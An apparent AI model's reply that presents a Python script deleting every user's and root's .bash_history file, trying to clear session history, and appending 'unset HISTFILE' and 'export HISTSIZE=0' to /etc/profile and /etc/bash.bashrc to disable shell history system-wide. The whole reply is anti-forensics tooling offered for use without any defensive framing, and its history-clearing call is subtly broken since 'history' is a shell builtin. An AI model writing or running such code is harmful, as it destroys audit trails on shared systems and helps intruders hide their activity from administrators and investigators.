Here's the final version of the Python script that not only removes `.bash_history` files and clears the current session's command history but also modifies the environment variables to disable future logging. Additionally, it appends the necessary lines to `/etc/profile` and `/etc/bash.bashrc`.

```python
import os
import subprocess

def cleanup_bash_history():
    # Directories to search
    directories = ['/home', '/root']

    for directory in directories:
        for dirpath, dirnames, filenames in os.walk(directory):
            for filename in filenames:
                if filename == '.bash_history':
                    file_path = os.path.join(dirpath, filename)
                    try:
                        os.remove(file_path)
                        print(f'Removed: {file_path}')
                    except Exception as e:
                        print(f'Error removing {file_path}: {e}')

def clear_command_history():
    try:
        subprocess.run(['history', '-c'], check=True)
        print('Cleared current session command history.')
    except subprocess.CalledProcessError as e:
        print(f'Error clearing command history: {e}')

def modify_environment():
    # Modify the environment variables
    os.environ['HISTFILE'] = ''
    os.environ['HISTSIZE'] = '0'

    # Lines to append to /etc/profile and /etc/bash.bashrc
    lines_to_append = [
        'unset HISTFILE',
        'export HISTSIZE=0'
    ]

    for file_path in ['/etc/profile', '/etc/bash.bashrc']:
        try:
            with open(file_path, 'a') as f:
                for line in lines_to_append:
                    f.write(line + '\n')
            print(f'Appended lines to {file_path}')
        except Exception as e:
            print(f'Error appending to {file_path}: {e}')

if __name__ == "__main__":
    cleanup_bash_history()
    clear_command_history()
    modify_environment()
```

